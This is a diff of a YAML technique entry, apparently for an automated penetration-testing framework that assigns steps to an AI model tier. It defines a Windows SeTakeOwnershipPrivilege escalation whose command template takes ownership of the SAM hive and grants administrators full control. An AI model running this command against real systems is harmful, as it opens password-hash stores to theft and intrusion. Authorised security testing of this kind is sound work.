@@ -2,15 +2,21 @@ name: setakeownership
 category: privesc
 description: SeTakeOwnershipPrivilege exploitation
 preconditions:
-  - os==windows
+- os==windows
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "takeown /f C:\Windows\System32\config\SAM && icacls C:\Windows\System32\config\SAM /grant administrators:F"
-parser: null
+command_template: 'takeown /f C:\Windows\System32\config\SAM && icacls C:\Windows\System32\config\SAM
+  /grant administrators:F
+
+  '
+parser: generic_parser
 expected_effects:
-  - action_completed
+- ownership_taken
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "SeTakeOwnershipPrivilege: take ownership of any object. Take ownership of SAM/SYSTEM hives, or sensitive files, then read/modify."
+mechanism: Full token privileges cheatsheet at [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin),
+  summary below will only list direct ways to exploit the privilege to obtain an admin
+  session or read sensitive files.
+hacktricks_ref: windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.md
